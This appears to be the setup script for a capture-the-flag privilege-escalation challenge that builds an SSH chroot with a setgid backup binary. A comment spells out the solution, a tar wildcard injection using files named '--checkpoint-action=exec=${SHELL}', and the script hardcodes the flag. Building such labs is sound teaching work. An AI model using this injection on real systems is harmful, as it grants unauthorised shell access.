#!/bin/bash
. ./functions-deb64.sh

#
# MAIN
#

initSSHChrootEnv

# Chal 1: Use tar to get the flag
#
# Solution:
#   ssh expl01@misc02.ctf.hf
#
#   TODO: Encapsulate this shit in a binary so the binary is setuid but not tar.
#   mkdir /tmp/mdube
#   cd /tmp/mdube
#   touch -- --checkpoint=1
#   touch -- '--checkpoint-action=exec=${SHELL}'
#   touch asdf
#   tar -cvzf /home/_ssh1s/test.tar.gz *
CHAL_NAME='expl01'
CHAL_USER='expl01'
CHAL_PASS='expl01'
CHAL_SHELL='/bin/sh'
CHAL_FLAG='k283QjjkBItb8VgJCeLT5hWIvHNREZR0'
cat /etc/passwd | grep $CHAL_USER':' > /dev/null
if [ $? -eq 1 ]; then
    sgid='expl01s'
    cmds=(/bin/ls /bin/rm /bin/mkdir \
    	    /bin/echo /usr/bin/touch /bin/tar \
            /usr/bin/id /usr/bin/vim /bin/bash \
            /bin/gzip)
    chrDir=$SSH_FOLDER'/'$CHAL_USER
    flagPath=$chrDir'/home/'$CHAL_USER'/flag.txt'
    chalPath=$chrDir'/home/'$CHAL_USER'/zeBackuper'
    srcPath=$chrDir'/home/'$CHAL_USER'/zeBackuper.c'

    createSSHChroot "$CHAL_NAME" "$CHAL_USER" "$CHAL_PASS" "$CHAL_SHELL"

    echo Copying chroot into binaries
    for c in ${cmds[@]}
    do
        addBinaryToChroot $c $chrDir $CHAL_USER
    done

    echo Configuring chroot
    addSecuredTmp $chrDir $CHAL_USER
#addPS1 $chrDir $CHAL_USER          # bug??
    setUmask $chrDir $CHAL_USER 0027
    fixNameResolution $chrDir $CHAL_USER

    echo "Step 1: Find the flaw" > $chrDir'/home/'$CHAL_USER'/README'
    echo "Step 2: Create a folder in /tmp to setup an exploit" >> $chrDir'/home/'$CHAL_USER'/README'

    /bin/echo Creating setgid group $sgid
    /usr/sbin/useradd $sgid
    /bin/mkdir $chrDir'/home/'$sgid
    /bin/chown root:$sgid $chrDir'/home/'$sgid
    /bin/chmod 770 $chrDir'/home/'$sgid

    /bin/echo Copy binary and source
    /bin/cp 'expl01/zeBackuper' $chalPath
    /bin/cp 'expl01/zeBackuper.c' $srcPath

    /bin/echo Set zeBackuper with sgid
    /bin/chown root:$sgid $chalPath
    /bin/chmod 555 $chalPath
    /bin/chmod g+s $chalPath

    /bin/echo Set zeBackuper.c security
    /bin/chown root:$CHAL_USER $srcPath
    /bin/chmod 740 $srcPath

    /bin/echo Creating flag
    /bin/echo $CHAL_FLAG > $flagPath
    /bin/chown root:$sgid $flagPath
    /bin/chmod 640 $flagPath

    grep "$sgid:" /etc/passwd >> $chrootDir'/etc/passwd'
    grep "$sgid:" /etc/group >> $chrootDir'/etc/group'
fi

